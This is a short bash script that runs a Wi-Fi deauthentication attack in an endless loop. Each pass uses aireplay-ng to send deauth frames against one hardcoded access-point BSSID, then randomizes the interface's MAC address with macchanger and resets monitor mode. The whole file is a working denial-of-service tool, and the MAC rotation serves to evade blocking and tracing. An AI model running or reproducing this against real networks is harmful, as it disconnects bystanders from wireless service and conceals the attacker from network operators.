#!/bin/bash

while true
do
    # BSSID can be configured as command input
    aireplay-ng -0  5 -a 6c:96:cf:e0:14:bd en0 # -c <client bssid>

    # code for changing channel can be written to sync the channels of both interfaces

    ifconfig en0 down
    macchanger -r en0 | grep 'New MAC'
    iwconfig en0 mode monitor
    ifconfig en0 up
    iwconfig en0 | grep 'Mode'
    sleep 3
    echo waiting
done